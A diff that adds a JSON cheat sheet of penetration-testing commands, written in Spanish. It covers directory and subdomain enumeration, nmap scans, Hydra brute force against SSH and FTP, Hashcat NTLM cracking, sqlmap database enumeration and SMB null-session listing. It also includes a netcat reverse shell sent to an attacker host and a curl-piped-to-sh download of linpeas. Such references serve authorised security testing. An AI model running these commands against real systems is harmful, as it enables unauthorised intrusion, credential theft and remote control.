@@ -1,0 +1,183 @@
+[
+    {
+        "title": "Gobuster directorios",
+        "command": "gobuster dir -u http://{RHOST} -w /usr/share/wordlists/dirb/common.txt",
+        "description": "Enumeración de directorios y archivos web",
+        "tags": [
+            "recon",
+            " web",
+            " fuzzing"
+        ],
+        "scope": "private"
+    },
+    {
+        "title": "Gobuster subdominios",
+        "command": "gobuster dns -d {DOMAIN} -w /usr/share/wordlists/subdomains.txt",
+        "description": "Enumeración de subdominios por fuerza bruta",
+        "tags": [
+            "recon",
+            " dns",
+            " fuzzing"
+        ],
+        "scope": "private"
+    },
+    {
+        "title": "Hashcat crackeo NTLM",
+        "command": "hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt",
+        "description": "Crackeo de hashes NTLM con GPU",
+        "tags": [
+            "cracking",
+            " hashcat"
+        ],
+        "scope": "private"
+    },
+    {
+        "title": "Hydra FTP bruteforce",
+        "command": "hydra -L usuarios.txt -P /usr/share/wordlists/rockyou.txt ftp://{RHOST}",
+        "description": "Ataque de fuerza bruta contra FTP",
+        "tags": [
+            "bruteforce",
+            " ftp"
+        ],
+        "scope": "private"
+    },
+    {
+        "title": "Hydra SSH bruteforce",
+        "command": "hydra -l {USER} -P /usr/share/wordlists/rockyou.txt ssh://{RHOST}",
+        "description": "Ataque de fuerza bruta contra SSH",
+        "tags": [
+            "bruteforce",
+            " ssh"
+        ],
+        "scope": "private"
+    },
+    {
+        "title": "Linpeas",
+        "command": "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh",
+        "description": "Script de enumeración para escalada de privilegios en Linux",
+        "tags": [
+            "privesc",
+            " linux"
+        ],
+        "scope": "private"
+    },
+    {
+        "title": "Netcat listener",
+        "command": "nc -lvnp {LPORT}",
+        "description": "Levanta un listener para recibir una reverse shell",
+        "tags": [
+            "shell",
+            " netcat"
+        ],
+        "scope": "private"
+    },
+    {
+        "title": "Netcat reverse shell",
+        "command": "nc -e /bin/bash {LHOST} {LPORT}",
+        "description": "Envía una shell reversa al host atacante",
+        "tags": [
+            "shell",
+            " netcat"
+        ],
+        "scope": "private"
+    },
+    {
+        "title": "Nikto scan",
+        "command": "nikto -h http://{RHOST}",
+        "description": "Escaneo de vulnerabilidades comunes en servidores web",
+        "tags": [
+            "web",
+            " vuln-scan"
+        ],
+        "scope": "private"
+    },
+    {
+        "title": "Nmap scripts default",
+        "command": "nmap -sC -sV -oN nmap_full.txt {RHOST}",
+        "description": "Escaneo con scripts NSE por defecto y guardado de salida",
+        "tags": [
+            "recon",
+            " nmap"
+        ],
+        "scope": "private"
+    },
+    {
+        "title": "Nmap todos los puertos",
+        "command": "nmap -p- -T4 {RHOST}",
+        "description": "Escaneo completo de los 65535 puertos",
+        "tags": [
+            "recon",
+            " nmap"
+        ],
+        "scope": "private"
+    },
+    {
+        "title": "SMB enum con enum4linux",
+        "command": "enum4linux -a {RHOST}",
+        "description": "Enumeración de recursos compartidos SMB, usuarios y grupos",
+        "tags": [
+            "recon",
+            " smb"
+        ],
+        "scope": "private"
+    },
+    {
+        "title": "SMB shares con smbclient",
+        "command": "smbclient -L //{RHOST}/ -N",
+        "description": "Listado de shares SMB sin autenticación",
+        "tags": [
+            "smb"
+        ],
+        "scope": "private"
+    },
+    {
+        "title": "SQLmap básico",
+        "command": "sqlmap -u \"http://{RHOST}/index.php?id=1\" --batch",
+        "description": "Detección automática de inyección SQL en parámetro id",
+        "tags": [
+            "web",
+            " sqlmap"
+        ],
+        "scope": "private"
+    },
+    {
+        "title": "SQLmap dump de base de datos",
+        "command": "sqlmap -u \"http://{RHOST}/index.php?id=1\" --dbs --batch",
+        "description": "Enumeración de bases de datos accesibles",
+        "tags": [
+            "web",
+            " sqlmap"
+        ],
+        "scope": "private"
+    },
+    {
+        "title": "Whatweb fingerprint",
+        "command": "whatweb -a 3 http://{RHOST}",
+        "description": "Identificación de tecnologías usadas en el sitio web",
+        "tags": [
+            "recon",
+            " web"
+        ],
+        "scope": "private"
+    },
+    {
+        "title": "test",
+        "command": "test",
+        "description": "test",
+        "tags": [
+            "test",
+            " test"
+        ],
+        "scope": "private"
+    },
+    {
+        "title": "WinPEAS",
+        "command": "winPEASx64.exe > winpeas_output.txt",
+        "description": "Script de enumeración para escalada de privilegios en Windows",
+        "tags": [
+            "privesc",
+            " windows"
+        ],
+        "scope": "private"
+    }
+]
